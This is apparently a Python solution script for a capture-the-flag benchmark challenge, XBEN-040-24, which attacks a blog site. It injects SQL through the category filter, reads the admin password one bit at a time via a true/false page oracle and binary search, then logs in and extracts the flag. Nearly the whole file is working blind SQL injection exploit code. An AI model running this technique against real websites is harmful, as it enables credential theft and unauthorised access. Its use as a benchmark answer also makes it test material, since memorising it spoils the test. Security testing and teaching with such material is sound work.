#!/usr/bin/env python3
"""XBEN-040-24 — "SQLi Exfiltration" (tags: blind_sqli).

The blog's category filter is injected into a query whose *rows* are never
shown: the page only checks whether any came back, and prints "Category does
not exist" when none did. That is one bit per request. The admin login on the
same site escapes its inputs properly, so the password has to be read out of the
database a bit at a time and then used on a form that cannot be injected.

Written in Python for the reason XBEN-037 was: hundreds of adaptive requests
with quoting in them is where shell scripting stops paying.

The same two rules apply here as there. A refused replay is not a negative
answer, so every reply is checked for `ok`; and the page's network allowance
bounds page code rather than a deliberate loop, so each probe resets it.
"""
import json
import os
import subprocess
import sys

# The binary, or a build of it: `H5I=../h5i/target/release/h5i`.
H5I = os.environ.get("H5I", "h5i")
SESSION = "xben040-poc"


def h5i(*args):
    return subprocess.run([H5I, *args], capture_output=True, text=True).stdout


def ask(condition):
    """True when the injected condition holds."""
    reply = json.loads(h5i("websec", "replay", "req_0", "--create",
                           "--set", "path=/index.php",
                           "--set", f"query.category=x' OR {condition}-- -",
                           "--reset-budget", "--session", SESSION))
    if not reply.get("ok"):
        raise RuntimeError(reply.get("response", {}).get("error") or reply.get("message"))
    body = json.loads(h5i("websec", "show", f"res_{reply['seq']}", "--session", SESSION))
    return "does not  exist" not in body["response"]["body"]["text"]


def number(expression, high=128):
    """Binary search a numeric expression the oracle can compare."""
    low = 0
    while low < high:
        mid = (low + high) // 2
        if ask(f"({expression})<={mid}"):
            high = mid
        else:
            low = mid + 1
    return low


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: xben-040-blind-sqli-exfiltration.py http://127.0.0.1:PORT")
    url = sys.argv[1]

    subprocess.run([H5I, "browser", "close", "--session", SESSION], capture_output=True)
    h5i("browser", "open", f"{url}/", "--session", SESSION, "--new", "--capture")

    # The oracle has to separate something before anything it says is worth
    # believing.
    if not ask("1=1") or ask("1=2"):
        sys.exit("the injection point does not answer true and false differently")

    length = number("SELECT LENGTH(password) FROM admins LIMIT 1", high=64)
    password = ""
    for position in range(1, length + 1):
        code = number(
            f"SELECT ASCII(SUBSTRING(password,{position},1)) FROM admins LIMIT 1")
        password += chr(code)
        print(f"\r  password: {password}", end="", file=sys.stderr, flush=True)
    print(file=sys.stderr)

    # The login escapes its inputs, so it is only reachable with the real
    # password — which is now known.
    reply = json.loads(h5i("websec", "replay", "req_0", "--create",
                           "--set", "method=POST", "--set", "path=/admin.php",
                           "--set", "form.username=admin",
                           "--set", f"form.password={password}",
                           "--reset-budget", "--session", SESSION))
    body = json.loads(h5i("websec", "show", f"res_{reply['seq']}", "--session", SESSION))
    import re
    found = re.search(r"FLAG\{[a-f0-9]{64}\}", body["response"]["body"]["text"])
    print(found.group(0) if found else "no flag found")
    subprocess.run([H5I, "browser", "close", "--session", SESSION], capture_output=True)


if __name__ == "__main__":
    main()
